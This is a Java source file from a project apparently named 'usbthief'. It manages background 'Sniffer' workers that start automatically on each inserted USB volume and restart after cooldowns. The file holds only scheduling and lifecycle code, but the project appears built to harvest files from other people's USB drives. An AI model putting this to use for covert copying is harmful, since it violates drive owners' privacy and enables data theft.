package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.ClockThread;
import com.superredrock.usbthief.core.DeviceManager;
import com.superredrock.usbthief.core.Service;
import com.superredrock.usbthief.core.Volume;
import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.device.VolumeInsertedEvent;
import com.superredrock.usbthief.core.event.device.VolumeRemovedEvent;
import com.superredrock.usbthief.core.event.device.VolumeStateChangedEvent;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

/**
 * Manages Sniffer lifecycle as a background Service.
 * <p>
 * Monitors Volumes via EventBus and manages corresponding Sniffer instances.
 * Handles creation, restart scheduling, cooldown, and cleanup of Sniffers.
 * <p>
 * Flow:
 * - VolumeInsertedEvent → create Sniffer for new IDLE volumes
 * - VolumeStateChangedEvent → react to OFFLINE/DISABLED/IDLE transitions
 * - Sniffer completion callback → schedule restart with cooldown
 * - VolumeRemovedEvent → stop and remove Sniffer
 */
public class SnifferLifecycleManager extends Service {

    private static volatile SnifferLifecycleManager INSTANCE;

    /** Active sniffers keyed by volume serial number */
    private final ConcurrentHashMap<String, SnifferEntry> sniffers = new ConcurrentHashMap<>();

    /** Active cooldown timers keyed by volume serial number */
    private final ConcurrentHashMap<String, ClockThread> timers = new ConcurrentHashMap<>();

    /** Whether init check has been done */
    private volatile boolean initialized = false;

    public enum RestartReason {
        NORMAL_COMPLETION,
        ERROR,
        STORAGE_PAUSE
    }

    /**
     * Holds a Sniffer and its associated metadata.
     */
    private static class SnifferEntry {
        final Sniffer sniffer;
        final String serialNumber;
        volatile RestartReason lastExitReason;

        SnifferEntry(Sniffer sniffer, String serialNumber) {
            this.sniffer = sniffer;
            this.serialNumber = serialNumber;
        }
    }

    private SnifferLifecycleManager() {
        registerEventListeners();
    }

    public static SnifferLifecycleManager getInstance() {
        if (INSTANCE == null) {
            synchronized (SnifferLifecycleManager.class) {
                if (INSTANCE == null) {
                    INSTANCE = new SnifferLifecycleManager();
                }
            }
        }
        return INSTANCE;
    }

    // ========== Event Listeners ==========

    private void registerEventListeners() {
        EventBus bus = EventBus.getInstance();

        bus.register(VolumeInsertedEvent.class, event -> {
            logger.info("Volume inserted: {}", event.volume().getSerialNumber());
        });

        bus.register(VolumeRemovedEvent.class, event -> {
            String serial = event.volume().getSerialNumber();
            logger.info("Volume removed, stopping sniffer: {}", serial);
            stopSnifferOnly(serial);
        });

        bus.register(VolumeStateChangedEvent.class, event -> {
            Volume volume = event.volume();
            String serial = volume.getSerialNumber();
            Volume.VolumeState newState = event.newState();

            switch (newState) {
                case OFFLINE, EJECTING -> {
                    logger.debug("Volume {} , stopping sniffer: {}", newState, serial);
                    stopSnifferOnly(serial);
                    if (!timers.containsKey(serial)) {
                        scheduleRestart(serial, RestartReason.NORMAL_COMPLETION);
                    }
                }
                case DISABLED -> {
                    logger.debug("Volume DISABLED, stopping sniffer: {}", serial);
                    stop(serial);
                }
                case IDLE -> {
                    if (event.oldState() == Volume.VolumeState.OFFLINE ||
                        event.oldState() == Volume.VolumeState.UNAVAILABLE) {
                        logger.debug("Volume became IDLE, will create sniffer on next tick: {}", serial);
                    }
                }
                default -> {}
            }
        });
    }

    // ========== Service tick ==========

    @Override
    protected void tick() {
        if (!initialized) {
            if (QueueManager.getDeviceManager() == null) return;
            initialized = true;
        }

        Collection<Volume> volumes = QueueManager.getDeviceManager().getAllVolumes();
        for (Volume volume : volumes) {
            String serial = volume.getSerialNumber();
            if (volume.getState() == Volume.VolumeState.IDLE &&
                !sniffers.containsKey(serial) &&
                !timers.containsKey(serial)) {
                createSniffer(volume);
            }
        }

        sniffers.entrySet().removeIf(entry -> {
            SnifferEntry se = entry.getValue();
            if (!se.sniffer.isAlive()) {
                logger.debug("Cleaned up finished sniffer for: {}", se.serialNumber);
                return true;
            }
            return false;
        });
    }

    @Override
    protected long getTickInterval() {
        return 200;
    }

    @Override
    protected TimeUnit getTickUnit() {
        return TimeUnit.MILLISECONDS;
    }

    @Override
    public String getServiceName() {
        return "SnifferLifecycleManager";
    }

    @Override
    public String getDescription() {
        return "Manages Sniffer creation, lifecycle, restart, and cooldown";
    }

    // ========== Sniffer Management ==========

    /**
     * Creates and starts a Sniffer for the given volume.
     */
    private void createSniffer(Volume volume) {
        String serial = volume.getSerialNumber();

        SnifferEntry existing = sniffers.get(serial);
        if (existing != null && existing.sniffer.isAlive()) {
            logger.debug("Sniffer already active for: {}", serial);
            return;
        }

        try {
            Sniffer sniffer = new Sniffer(volume);
            sniffer.onFinish()
                    .thenRun(() -> {
                        if (volume.isConnected()){
                            logger.info("Sniffer finished for {} (reason: {})", serial, RestartReason.NORMAL_COMPLETION);
                            scheduleRestart(serial, RestartReason.NORMAL_COMPLETION);
                        }
                    })
                    .exceptionally(ex -> {
                        if (volume.isConnected()){
                            logger.warn("Sniffer error for {}", serial, ex);
                            scheduleRestart(serial, RestartReason.ERROR);
                        }
                        return null;
                    });
            sniffers.put(serial, new SnifferEntry(sniffer, serial));
            sniffer.start();
            logger.info("Sniffer started for volume: {} at {}", serial, volume.getRootPath());
        } catch (Exception e) {
            logger.warn("Failed to create sniffer for {}", serial, e);
            scheduleRestart(serial, RestartReason.ERROR);
        }
    }

    /**
     * Schedules a restart after the appropriate cooldown delay.
     */
    private void scheduleRestart(String serial, RestartReason reason) {
        long delayMs = getRestartDelayMs(reason);

        if (delayMs <= 0) {
            Volume vol = getVolumeBySerial(serial);
            if (vol != null && vol.getState() == Volume.VolumeState.IDLE && !sniffers.containsKey(serial)) {
                logger.info("No delay, restarting sniffer for: {}", serial);
                createSniffer(vol);
            }
            return;
        }

        ClockThread timer = new ClockThread(delayMs)
            .thenRun(() -> {
                timers.remove(serial);
                Volume vol = getVolumeBySerial(serial);
                if (vol != null && vol.getState() == Volume.VolumeState.IDLE && !sniffers.containsKey(serial)) {
                    logger.info("Cooldown elapsed, restarting sniffer for: {}", serial);
                    createSniffer(vol);
                } else {
                    logger.debug("Skipping restart for {}: volume not IDLE or sniffer already active", serial);
                }
            });
        timers.put(serial, timer);
        timer.start();
        logger.info("Scheduled restart for {} in {} min (reason: {})", serial, TimeUnit.MILLISECONDS.toMinutes(delayMs), reason);
    }

    private void cancelTimer(String serial) {
        ClockThread timer = timers.remove(serial);
        if (timer != null) {
            timer.cancel();
        }
    }

    private Volume getVolumeBySerial(String serial) {
        DeviceManager dm = QueueManager.getDeviceManager();
        return dm != null ? dm.getVolumeBySerial(serial) : null;
    }


    /**
     * Gets the restart delay in milliseconds based on the reason.
     */
    private long getRestartDelayMs(RestartReason reason) {
        ConfigManager config = ConfigManager.getInstance();
        return switch (reason) {
            case NORMAL_COMPLETION ->
                TimeUnit.MINUTES.toMillis(config.get(ConfigSchema.SNIFFER_WAIT_NORMAL_MINUTES));
            case ERROR ->
                TimeUnit.MINUTES.toMillis(config.get(ConfigSchema.SNIFFER_WAIT_ERROR_MINUTES));
            case STORAGE_PAUSE -> 0;
        };
    }

    /**
     * Stops the sniffer for a volume without cancelling any active cooldown timer.
     */
    private void stopSnifferOnly(String serial) {
        SnifferEntry entry = sniffers.remove(serial);
        if (entry != null) {
            entry.sniffer.close();
            logger.debug("Stopped sniffer for: {}", serial);
        }
    }

    // ========== Public API ==========

    /**
     * Stops the scanner for a given volume serial number.
     */
    public void stop(String serialNumber) {
        cancelTimer(serialNumber);
        SnifferEntry entry = sniffers.remove(serialNumber);
        if (entry != null) {
            entry.sniffer.close();
            logger.debug("Stopped scanner for: {}", serialNumber);
        }
    }

    /**
     * Manually restart the scanner for a volume. Cancels any pending cooldown.
     */
    public void restart(Volume volume) {
        String serial = volume.getSerialNumber();
        cancelTimer(serial);
        SnifferEntry entry = sniffers.remove(serial);
        if (entry != null) {
            entry.sniffer.close();
        }
        createSniffer(volume);
    }

    /**
     * Pauses the scanner for a volume (stops it, schedules restart after normal delay).
     */
    public void pause(Volume volume) {
        String serial = volume.getSerialNumber();
        stop(serial);
        scheduleRestart(serial, RestartReason.NORMAL_COMPLETION);
    }

    /**
     * Returns true if a scanner is active for the given serial.
     */
    public boolean isActive(String serialNumber) {
        SnifferEntry entry = sniffers.get(serialNumber);
        return entry != null && entry.sniffer.isAlive();
    }

    /**
     * Returns the number of active scanners.
     */
    public int getActiveCount() {
        return (int) sniffers.values().stream().filter(e -> e.sniffer.isAlive()).count();
    }

    /**
     * Returns true if a restart is pending for the given serial.
     */
    public boolean isRestartPending(String serialNumber) {
        return timers.containsKey(serialNumber);
    }

    /**
     * Gets the remaining cooldown time in milliseconds for a volume, or 0 if not in cooldown.
     */
    public long getRemainingCooldownMs(String serialNumber) {
        ClockThread timer = timers.get(serialNumber);
        return timer != null ? timer.getRemaining(TimeUnit.MILLISECONDS) : 0;
    }

    /**
     * Returns debug snapshots for all tracked sniffers (active and in-cooldown).
     */
    public List<SnifferDebugSnapshot> getDebugSnapshots() {
        List<SnifferDebugSnapshot> snapshots = new ArrayList<>();

        for (SnifferEntry entry : sniffers.values()) {
            if (entry.sniffer.isAlive()) {
                SnifferDebugSnapshot raw = entry.sniffer.getDebugSnapshot();
                snapshots.add(new SnifferDebugSnapshot(
                    raw.driveLetter(),
                    raw.serialNumber(),
                    raw.phase(),
                    raw.changeCount(),
                    raw.threshold(),
                    raw.secondsUntilReset(),
                    raw.resetIntervalSec(),
                    raw.watchedDirCount(),
                    0L,
                    ""
                ));
            }
        }

        for (var entry : timers.entrySet()) {
            String serial = entry.getKey();
            boolean hasActive = snapshots.stream().anyMatch(s -> s.serialNumber().equals(serial));
            if (!hasActive) {
                long remaining = entry.getValue().getRemaining(TimeUnit.MILLISECONDS);
                String reason = remaining > 0 ? "restart" : "";
                Volume vol = getVolumeBySerial(serial);
                snapshots.add(new SnifferDebugSnapshot(
                    vol != null ? vol.getDriveLetter() : serial,
                    serial,
                    SnifferPhase.FINISHED,
                    0, 0, 0, 0, 0,
                    remaining,
                    reason
                ));
            }
        }

        return snapshots;
    }

    // ========== Cleanup ==========

    @Override
    protected void cleanup() {
        for (ClockThread timer : timers.values()) {
            timer.cancel();
        }
        timers.clear();

        for (SnifferEntry entry : sniffers.values()) {
            try {
                entry.sniffer.close();
            } catch (Exception e) {
                logger.warn("Error closing sniffer for {}: {}", entry.serialNumber, e);
            }
        }
        sniffers.clear();
        logger.info("All sniffers stopped and cleaned up");
    }

}
